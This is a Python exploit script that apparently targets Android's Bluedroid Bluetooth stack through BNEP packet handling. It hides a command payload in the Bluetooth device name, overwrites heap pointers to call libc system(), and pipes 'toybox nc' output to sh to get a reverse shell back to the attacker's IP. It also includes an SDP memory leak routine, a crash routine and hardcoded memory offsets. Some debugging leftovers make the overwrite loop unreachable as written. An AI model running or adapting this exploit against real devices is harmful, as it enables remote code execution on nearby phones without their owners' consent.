import os
import sys
import time
import struct
import select
import binascii

import bluetooth
from bluetooth import _bluetooth as bt

import bluedroid
import connectback

import pwn

#MY_IP = '10.0.1.3'
MY_IP = '192.168.1.34'
TARGET_BTADDR = '78:f8:82:95:6d:85'
HCI_DEV = 'hci1'

LIBC_BASE = 0xf745b000
BLUETOOTH_BSS_BASE = 0xf426c000

SHELL_SCRIPT = b'toybox nc {ip} {port} | sh'

NC_PORT = 8888
STDIN_PORT = 1234
STDOUT_PORT = 1235

PWNING_TIMEOUT = 3

BNEP_PSM = 15
MAX_BT_NAME = 0xf5

SYSTEM_OFFSET = 0x3ee2c
ACL_NAME_OFFSET = 0x112

def set_bt_name(payload, src_hci, src, dst):
    # Create raw HCI sock to set our BT name
    raw_sock = bt.hci_open_dev(bt.hci_devid(src_hci))
    flt = bt.hci_filter_new()
    bt.hci_filter_all_ptypes(flt)
    bt.hci_filter_all_events(flt)
    raw_sock.setsockopt(bt.SOL_HCI, bt.HCI_FILTER, flt)

    # Send raw HCI command to our controller to change the BT name (first 3 bytes are padding for alignment)
    raw_sock.sendall(binascii.unhexlify('01130cf8cccccc') + payload.ljust(MAX_BT_NAME, b'\x00'))
    raw_sock.close()
    time.sleep(0.1)

    # Connect to BNEP to "refresh" the name (does auth)
    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))
    bnep.close()

    # Connect to BNEP to "refresh" the name (does auth)
    # Close ACL connection
    os.system('hcitool dc %s' % (dst,))

def set_rand_bdaddr(src_hci):
    addr = ['%02x' % (ord(c),) for c in os.urandom(6)]
    # NOTW: works only with CSR bluetooth adapters!
    os.system('sudo bccmd -d %s psset -r bdaddr 0x%s 0x00 0x%s 0x%s 0x%s 0x00 0x%s 0x%s' %
              (src_hci, addr[3], addr[5], addr[4], addr[2], addr[1], addr[0]))
    final_addr = ':'.join(addr)
    print('[*] Set %s to new rand BDADDR %s' % (src_hci, final_addr))
    while bt.hci_devid(final_addr) < 0:
        time.sleep(0.1)
    return final_addr

def pwn(dst, system_addr, acl_name_addr, my_ip):
    src = set_rand_bdaddr(HCI_DEV)

    payload = struct.pack('<III', 0xAAAA1722, 0x41414141, system_addr) + b'";\n' + \
                          SHELL_SCRIPT.format(ip=my_ip, port=NC_PORT) + b'\n#'

    assert len(payload) < MAX_BT_NAME
    assert b'\x00' not in payload

    print ('[*] Setting BT name...')
    #set_bt_name(payload, HCI_DEV, src, dst)
    set_bt_name('babobabo', HCI_DEV, src, dst)

    print ('[*] Connecting to BNEP again')

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)
    bnep.bind((src, 0))
    bnep.connect((dst, BNEP_PSM))

    for i in range(90000):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))
        time.sleep(1)
        print "."

    return

    print ('[*] Allocate a lot of listnodes...')
    for i in range(20):
        bnep.send(binascii.unhexlify('8109' + '800109' * 100))

    print ('[*] Overwrite pointers...')
    for i in range(1000):
        _, writeable, _ = select.select([], [bnep], [], PWNING_TIMEOUT)
        if not writeable:
            break
        bnep.send(binascii.unhexlify('810100') + struct.pack('<II', 0, acl_name_addr))

def doit(dst, my_ip):
    os.system('hciconfig %s sspmode 0' % (HCI_DEV,))
    os.system('hcitool dc %s' % (dst,))

    sh_s, stdin, stdout = connectback.create_sockets(NC_PORT, STDIN_PORT, STDOUT_PORT)

    SYSTEM_ADDR = LIBC_BASE + SYSTEM_OFFSET
    ACL_NAME_ADDR = BLUETOOTH_BSS_BASE + ACL_NAME_OFFSET

    print ("[*] SYSTEM_ADDR: 0x%x" % SYSTEM_ADDR)
    print ("[*] PAYLOAD_ADDR: 0x%x" % ACL_NAME_ADDR)

    pwn(dst, SYSTEM_ADDR, ACL_NAME_ADDR, my_ip)
    readable, _, _ = select.select([sh_s], [], [], PWNING_TIMEOUT)
    if readable:
        print('[*] Done')
        connectback.interactive_shell(sh_s, stdin, stdout, my_ip, STDIN_PORT, STDOUT_PORT)

def leak(dst):
    print ("[*] Connecting SDP...")

    result = bluedroid.my_sdp_info_leak(dst)

    i = 0
    j = 0

    print ("[*] Stack dump...")
    for x in result:
        for y in x:
            print("%d:%d: 0x%x" % (i,j,y))
            j += 1
        i += 1
        j = 0

    #LIBC_OFFSET = 0x557f3
    #LIBC_BASE = result[5][0] - LIBC_OFFSET
    #print("[*] LIBC_BASE: 0x%0x" % LIBC_BASE)

def crash(dst):
    src = set_rand_bdaddr(HCI_DEV)

    bnep = bluetooth.BluetoothSocket(bluetooth.L2CAP)

    bnep.bind( (src, 0) )
    bnep.connect( (dst, BNEP_PSM) )

    print("[*] BNEP Connected.")

    for i in range(20):
        bnep.send( binascii.unhexlify('8109' + '800109' * 100) )

    for i in range(1000):
        if i % 10 == 0:
            sys.stdout.write('.')
            sys.stdout.flush()
        bnep.send( binascii.unhexlify('810100') + struct.pack('<II', 0, 0xcafebabe+i) )

    print ("")

if __name__ == '__main__':

    #bluedroid.my_sdp_info(TARGET_BTADDR)
    #bluedroid.my_evil_sdp_info_leak(TARGET_BTADDR)

    #leak(TARGET_BTADDR)
    #crash(TARGET_BTADDR)
    doit(TARGET_BTADDR, MY_IP)

    sys.exit(0)
